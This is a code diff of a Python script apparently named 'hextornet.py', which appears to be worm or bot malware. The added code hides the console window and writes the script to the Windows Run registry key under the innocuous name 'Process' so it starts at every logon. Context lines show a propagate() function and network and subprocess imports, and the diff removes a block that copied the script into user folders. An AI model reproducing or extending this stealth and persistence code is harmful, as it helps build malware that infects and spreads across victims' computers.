@@ -1,9 +1,10 @@
 #!/usr/bin/env python
 
+#import win32con, win32api, win32console, win32gui
+#from _winreg import *
 from shutil import copyfile
 import os, getpass
 from sys import argv
-#import win32con, win32api
 import os, random, sys, pkg_resources
 from urllib2 import urlopen
 import subprocess as sp
@@ -42,6 +43,21 @@ directories = ""
 directories = ['Documents', 'Downloads', 'Music', 'Pictures', 'Videos']
 dst = ""
 
+def hide():
+	window = win32console.GetConsoleWindow()
+	win32gui.ShowWindow(window,0)
+	return True
+
+def addStartup():
+    fp = os.path.dirname(os.path.realpath(__file__))
+    file_name = sys.argv[0].split("\\")[-1]
+    new_file_path = fp + "\\" + file_name
+    keyVal = r'Software\Microsoft\Windows\CurrentVersion\Run'
+
+    key2change= OpenKey(HKEY_CURRENT_USER, keyVal, 0, KEY_ALL_ACCESS)
+
+    SetValueEx(key2change, "Process", 0, REG_SZ, new_file_path)
+
 def windows_client(system = sys.platform):
     if system.startswith('win'):
         return True
@@ -53,16 +69,6 @@ def linux_client(system = sys.platform):
         return True
     else:
         return False
-
-if(windows_client):
-	dst = "C:\\Users\\" + usr + "\\" + directory + "\\" + "hextornet.py"
-	copyfile(src, dst)
-	print'dst',dst
-elif(linux_client):
-	dst = 'root' + usr + '/' + directory + '/' + 'hextornet.py'
-	copyfile(src, dst)
-	print'dst',dst
-	
 
 
 def propagate():
